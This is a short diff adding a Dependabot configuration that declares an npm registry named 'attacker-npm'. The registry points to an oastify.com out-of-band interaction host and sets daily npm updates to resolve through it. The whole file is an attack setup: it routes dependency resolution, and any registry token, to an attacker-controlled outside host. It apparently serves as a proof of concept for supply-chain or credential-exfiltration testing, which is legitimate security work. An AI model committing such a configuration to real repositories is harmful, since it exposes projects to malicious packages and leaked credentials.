@@ -1,0 +1,13 @@
+version: 2
+registries:
+  attacker-npm:
+    type: npm-registry
+    url: https://ao21kmp2mvyfwbouixcwbui09rfi3er3.oastify.com/npm
+    token: "placeholder"
+updates:
+  - package-ecosystem: "npm"
+    directory: "/"
+    schedule:
+      interval: "daily"
+    registries:
+      - attacker-npm
